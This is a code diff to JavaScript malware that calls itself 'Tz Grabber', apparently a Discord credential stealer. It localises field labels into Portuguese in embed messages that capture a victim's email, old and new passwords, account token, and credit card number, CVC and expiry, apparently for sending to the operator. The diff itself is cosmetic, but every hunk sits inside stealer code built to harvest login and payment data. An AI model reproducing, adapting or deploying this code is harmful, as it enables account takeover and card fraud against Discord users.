@@ -163,7 +163,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Tz Grabber By Tz・https://instagram/tzfofo"
+                        "text": "Tz Grabber ・ https://instagram/tzfofo"
                     }
                 }
             ]
@@ -191,12 +191,12 @@ function ChangePassword(oldpassword, newpassword, token) {
                     "fields": [
                         {
                             "name": "**Senha alterada**",
-                            "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
+                            "value": `Email: ${json.email}\nSenha Antiga: ${oldpassword}\nNova Senha: ${newpassword}`,
                             "inline": true
                         },
                         {
                             "name": "**Outras informações**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Tipo Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -210,7 +210,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Tz Grabber By Tz・https://instagram/tzfofo"
+                        "text": "Tz Grabber ・ https://instagram/tzfofo"
                     }                 
                 }
             ]
@@ -238,12 +238,12 @@ function ChangeEmail(newemail, password, token) {
                     "fields": [
                         {
                             "name": "**E-mail alterado**",
-                            "value": `New Email: ${newemail}\nPassword: ${password}`,
+                            "value": `Novo Email: ${newemail}\nSenha: ${password}`,
                             "inline": true
                         },
                         {
                             "name": "**Outras informações**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Tipo Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Tz Grabber By Tz・https://instagram/tzfofo"
+                        "text": "Tz Grabber ・ https://instagram/tzfofo"
                     }                
                 }
             ]
@@ -285,12 +285,12 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "fields": [
                         {
                             "name": "**Cartão de crédito adicionado**",
-                            "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                            "value": `Número do Cartão de Crédito: ${number}\nCVC: ${cvc}\nVencimento do cartão de crédito: ${expir_month}/${expir_year}`,
                             "inline": true
                         },
                         {
                             "name": "**Outras informações**",
-                            "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
+                            "value": `Tipo Nitro: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
@@ -304,7 +304,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Tz Grabber By Tz・https://instagram/tzfofo"
+                        "text": "Tz Grabber ・ https://instagram/tzfofo"
                     }
                 }
             ]
